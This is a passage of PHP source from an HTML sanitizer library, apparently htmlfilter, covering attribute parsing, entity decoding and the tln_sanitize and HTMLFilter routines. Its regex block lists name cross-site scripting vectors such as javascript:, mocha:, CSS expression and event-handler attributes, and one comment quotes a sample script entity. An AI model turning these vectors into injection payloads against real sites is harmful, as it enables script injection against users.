                        if ($regary == false) {
                            return array(false, false, false, $lt, strlen($body));
                        }
                        list($pos, $attval, $match) = $regary;
                        $pos++;
                        $attary{$attname} = '\'' . $attval . '\'';
                    } else {
                        if ($quot == '"') {
                            $regary = tln_findnxreg($body, $pos + 1, '\"');
                            if ($regary == false) {
                                return array(false, false, false, $lt, strlen($body));
                            }
                            list($pos, $attval, $match) = $regary;
                            $pos++;
                            $attary{$attname} = '"' . $attval . '"';
                        } else {
                            /**
                             * These are hateful. Look for \s, or >.
                             */
                            $regary = tln_findnxreg($body, $pos, '[\s>]');
                            if ($regary == false) {
                                return array(false, false, false, $lt, strlen($body));
                            }
                            list($pos, $attval, $match) = $regary;
                            /**
                             * If it's ">" it will be caught at the top.
                             */
                            $attval = preg_replace('/\"/s', '&quot;', $attval);
                            $attary{$attname} = '"' . $attval . '"';
                        }
                    }
                } else {
                    if (preg_match('|[\w/>]|', $char)) {
                        /**
                         * That was attribute type 4.
                         */
                        $attary{$attname} = '"yes"';
                    } else {
                        /**
                         * An illegal character. Find next '>' and return.
                         */
                        $gt = tln_findnxstr($body, $pos, '>');
                        return array(false, false, false, $lt, $gt);
                    }
                }
        }
    }
    /**
     * The fact that we got here indicates that the tag end was never
     * found. Return invalid tag indication so it gets stripped.
     */
    return array(false, false, false, $lt, strlen($body));
}

/**
 * Translates entities into literal values so they can be checked.
 *
 * @param string $attvalue the by-ref value to check.
 * @param string $regex    the regular expression to check against.
 * @param boolean $hex        whether the entites are hexadecimal.
 * @return boolean            True or False depending on whether there were matches.
 */
function tln_deent(&$attvalue, $regex, $hex = false)
{
    preg_match_all($regex, $attvalue, $matches);
    if (is_array($matches) && sizeof($matches[0]) > 0) {
        $repl = array();
        for ($i = 0; $i < sizeof($matches[0]); $i++) {
            $numval = $matches[1][$i];
            if ($hex) {
                $numval = hexdec($numval);
            }
            $repl{$matches[0][$i]} = chr($numval);
        }
        $attvalue = strtr($attvalue, $repl);
        return true;
    } else {
        return false;
    }
}

/**
 * This function checks attribute values for entity-encoded values
 * and returns them translated into 8-bit strings so we can run
 * checks on them.
 *
 * @param string $attvalue A string to run entity check against.
 * @return             Void, modifies a reference value.
 */
function tln_defang(&$attvalue)
{
    /**
     * Skip this if there aren't ampersands or backslashes.
     */
    if (strpos($attvalue, '&') === false
        && strpos($attvalue, '\\') === false
    ) {
        return;
    }
    do {
        $m = false;
        $m = $m || tln_deent($attvalue, '/\&#0*(\d+);*/s');
        $m = $m || tln_deent($attvalue, '/\&#x0*((\d|[a-f])+);*/si', true);
        $m = $m || tln_deent($attvalue, '/\\\\(\d+)/s', true);
    } while ($m == true);
    $attvalue = stripslashes($attvalue);
}

/**
 * Kill any tabs, newlines, or carriage returns. Our friends the
 * makers of the browser with 95% market value decided that it'd
 * be funny to make "java[tab]script" be just as good as "javascript".
 *
 * @param string $attvalue     The attribute value before extraneous spaces removed.
 * @return     Void, modifies a reference value.
 */
function tln_unspace(&$attvalue)
{
    if (strcspn($attvalue, "\t\r\n\0 ") != strlen($attvalue)) {
        $attvalue = str_replace(
            array("\t", "\r", "\n", "\0", " "),
            array('', '', '', '', ''),
            $attvalue
        );
    }
}

/**
 * This function runs various checks against the attributes.
 *
 * @param string $tagname            String with the name of the tag.
 * @param array $attary            Array with all tag attributes.
 * @param array $rm_attnames        See description for tln_sanitize
 * @param array $bad_attvals        See description for tln_sanitize
 * @param array $add_attr_to_tag See description for tln_sanitize
 * @return                    Array with modified attributes.
 */
function tln_fixatts(
    $tagname,
    $attary,
    $rm_attnames,
    $bad_attvals,
    $add_attr_to_tag
) {
    while (list($attname, $attvalue) = each($attary)) {
        /**
         * See if this attribute should be removed.
         */
        foreach ($rm_attnames as $matchtag => $matchattrs) {
            if (preg_match($matchtag, $tagname)) {
                foreach ($matchattrs as $matchattr) {
                    if (preg_match($matchattr, $attname)) {
                        unset($attary{$attname});
                        continue;
                    }
                }
            }
        }
        /**
         * Remove any backslashes, entities, or extraneous whitespace.
         */
        tln_defang($attvalue);
        tln_unspace($attvalue);

        /**
         * Now let's run checks on the attvalues.
         * I don't expect anyone to comprehend this. If you do,
         * get in touch with me so I can drive to where you live and
         * shake your hand personally. :)
         */
        foreach ($bad_attvals as $matchtag => $matchattrs) {
            if (preg_match($matchtag, $tagname)) {
                foreach ($matchattrs as $matchattr => $valary) {
                    if (preg_match($matchattr, $attname)) {
                        /**
                         * There are two arrays in valary.
                         * First is matches.
                         * Second one is replacements
                         */
                        list($valmatch, $valrepl) = $valary;
                        $newvalue = preg_replace($valmatch, $valrepl, $attvalue);
                        if ($newvalue != $attvalue) {
                            $attary{$attname} = $newvalue;
                        }
                    }
                }
            }
        }
    }
    /**
     * See if we need to append any attributes to this tag.
     */
    foreach ($add_attr_to_tag as $matchtag => $addattary) {
        if (preg_match($matchtag, $tagname)) {
            $attary = array_merge($attary, $addattary);
        }
    }
    return $attary;
}

/**
 *
 * @param string $body                    The HTML you wish to filter
 * @param array $tag_list                see description above
 * @param array $rm_tags_with_content see description above
 * @param array $self_closing_tags    see description above
 * @param boolean $force_tag_closing    see description above
 * @param array $rm_attnames            see description above
 * @param array $bad_attvals            see description above
 * @param array $add_attr_to_tag        see description above
 * @return string                       Sanitized html safe to show on your pages.
 */
function tln_sanitize(
    $body,
    $tag_list,
    $rm_tags_with_content,
    $self_closing_tags,
    $force_tag_closing,
    $rm_attnames,
    $bad_attvals,
    $add_attr_to_tag
) {
    /**
     * Normalize rm_tags and rm_tags_with_content.
     */
    $rm_tags = array_shift($tag_list);
    @array_walk($tag_list, 'tln_casenormalize');
    @array_walk($rm_tags_with_content, 'tln_casenormalize');
    @array_walk($self_closing_tags, 'tln_casenormalize');
    /**
     * See if tag_list is of tags to remove or tags to allow.
     * false  means remove these tags
     * true      means allow these tags
     */
    $curpos = 0;
    $open_tags = array();
    $trusted = "<!-- begin tln_sanitized html -->\n";
    $skip_content = false;
    /**
     * Take care of netscape's stupid javascript entities like
     * &{alert('boo')};
     */
    $body = preg_replace('/&(\{.*?\};)/si', '&amp;\\1', $body);
    while (($curtag = tln_getnxtag($body, $curpos)) != false) {
        list($tagname, $attary, $tagtype, $lt, $gt) = $curtag;
        $free_content = substr($body, $curpos, $lt - $curpos);
        if ($skip_content == false) {
            $trusted .= $free_content;
        } else {
        }
        if ($tagname != false) {
            if ($tagtype == 2) {
                if ($skip_content == $tagname) {
                    /**
                     * Got to the end of tag we needed to remove.
                     */
                    $tagname = false;
                    $skip_content = false;
                } else {
                    if ($skip_content == false) {
                        if (isset($open_tags{$tagname}) &&
                            $open_tags{$tagname} > 0
                        ) {
                            $open_tags{$tagname}--;
                        } else {
                            $tagname = false;
                        }
                    } else {
                    }
                }
            } else {
                /**
                 * $rm_tags_with_content
                 */
                if ($skip_content == false) {
                    /**
                     * See if this is a self-closing type and change
                     * tagtype appropriately.
                     */
                    if ($tagtype == 1
                        && in_array($tagname, $self_closing_tags)
                    ) {
                        $tagtype = 3;
                    }
                    /**
                     * See if we should skip this tag and any content
                     * inside it.
                     */
                    if ($tagtype == 1
                        && in_array($tagname, $rm_tags_with_content)
                    ) {
                        $skip_content = $tagname;
                    } else {
                        if (($rm_tags == false
                                && in_array($tagname, $tag_list)) ||
                            ($rm_tags == true
                                && !in_array($tagname, $tag_list))
                        ) {
                            $tagname = false;
                        } else {
                            if ($tagtype == 1) {
                                if (isset($open_tags{$tagname})) {
                                    $open_tags{$tagname}++;
                                } else {
                                    $open_tags{$tagname} = 1;
                                }
                            }
                            /**
                             * This is where we run other checks.
                             */
                            if (is_array($attary) && sizeof($attary) > 0) {
                                $attary = tln_fixatts(
                                    $tagname,
                                    $attary,
                                    $rm_attnames,
                                    $bad_attvals,
                                    $add_attr_to_tag
                                );
                            }
                        }
                    }
                } else {
                }
            }
            if ($tagname != false && $skip_content == false) {
                $trusted .= tln_tagprint($tagname, $attary, $tagtype);
            }
        } else {
        }
        $curpos = $gt + 1;
    }
    $trusted .= substr($body, $curpos, strlen($body) - $curpos);
    if ($force_tag_closing == true) {
        foreach ($open_tags as $tagname => $opentimes) {
            while ($opentimes > 0) {
                $trusted .= '</' . $tagname . '>';
                $opentimes--;
            }
        }
        $trusted .= "\n";
    }
    $trusted .= "<!-- end tln_sanitized html -->\n";
    return $trusted;
}

// 
// Use the nifty htmlfilter library
//


function HTMLFilter($body, $trans_image_path, $block_external_images = false)
{

    $tag_list = array(
        false,
        "object",
        "meta",
        "html",
        "head",
        "base",
        "link",
        "frame",
        "iframe",
        "plaintext",
        "marquee"
    );

    $rm_tags_with_content = array(
        "script",
        "applet",
        "embed",
        "title",
        "frameset",
        "xmp",
        "xml"
    );

    $self_closing_tags = array(
        "img",
        "br",
        "hr",
        "input",
        "outbind"
    );

    $force_tag_closing = true;

    $rm_attnames = array(
        "/.*/" =>
            array(
                // "/target/i",
                "/^on.*/i",
                "/^dynsrc/i",
                "/^data.*/i",
                "/^lowsrc.*/i"
            )
    );

    $bad_attvals = array(
        "/.*/" =>
            array(
                "/^src|background/i" =>
                    array(
                        array(
                            '/^([\'"])\s*\S+script\s*:.*([\'"])/si',
                            '/^([\'"])\s*mocha\s*:*.*([\'"])/si',
                            '/^([\'"])\s*about\s*:.*([\'"])/si'
                        ),
                        array(
                            "\\1$trans_image_path\\2",
                            "\\1$trans_image_path\\2",
                            "\\1$trans_image_path\\2",
                            "\\1$trans_image_path\\2"
                        )
                    ),
                "/^href|action/i" =>
                    array(
                        array(
                            '/^([\'"])\s*\S+script\s*:.*([\'"])/si',
                            '/^([\'"])\s*mocha\s*:*.*([\'"])/si',
                            '/^([\'"])\s*about\s*:.*([\'"])/si'
                        ),
                        array(
                            "\\1#\\1",
                            "\\1#\\1",
                            "\\1#\\1",
                            "\\1#\\1"
                        )
                    ),
                "/^style/i" =>
                    array(
                        array(
                            "/expression/i",
                            "/binding/i",
                            "/behaviou*r/i",
                            "/include-source/i",
                            '/position\s*:\s*absolute/i',
                            '/url\s*\(\s*([\'"])\s*\S+script\s*:.*([\'"])\s*\)/si',
                            '/url\s*\(\s*([\'"])\s*mocha\s*:.*([\'"])\s*\)/si',
                            '/url\s*\(\s*([\'"])\s*about\s*:.*([\'"])\s*\)/si',
                            '/(.*)\s*:\s*url\s*\(\s*([\'"]*)\s*\S+script\s*:.*([\'"]*)\s*\)/si'
                        ),
                        array(
                            "idiocy",
                            "idiocy",
                            "idiocy",
                            "idiocy",
                            "",
                            "url(\\1#\\1)",
                            "url(\\1#\\1)",
                            "url(\\1#\\1)",
                            "url(\\1#\\1)",
                            "url(\\1#\\1)",
                            "\\1:url(\\2#\\3)"
                        )
                    )
            )
    );

    if ($block_external_images) {
        array_push(
            $bad_attvals{'/.*/'}{'/^src|background/i'}[0],
            '/^([\'\"])\s*https*:.*([\'\"])/si'
        );
        array_push(
            $bad_attvals{'/.*/'}{'/^src|background/i'}[1],
            "\\1$trans_image_path\\1"
        );
        array_push(
            $bad_attvals{'/.*/'}{'/^style/i'}[0],
            '/url\(([\'\"])\s*https*:.*([\'\"])\)/si'
        );
        array_push(
            $bad_attvals{'/.*/'}{'/^style/i'}[1],
            "url(\\1$trans_image_path\\1)"
        );
    }

    $add_attr_to_tag = array(
        "/^a$/i" =>
            array('target' => '"_blank"')
    );

    $trusted = tln_sanitize(
        $body,
        $tag_list,
        $rm_tags_with_content,
        $self_closing_tags,
        $force_tag_closing,
        $rm_attnames,
        $bad_attvals,
        $add_attr_to_tag
    );
    return $trusted;
}
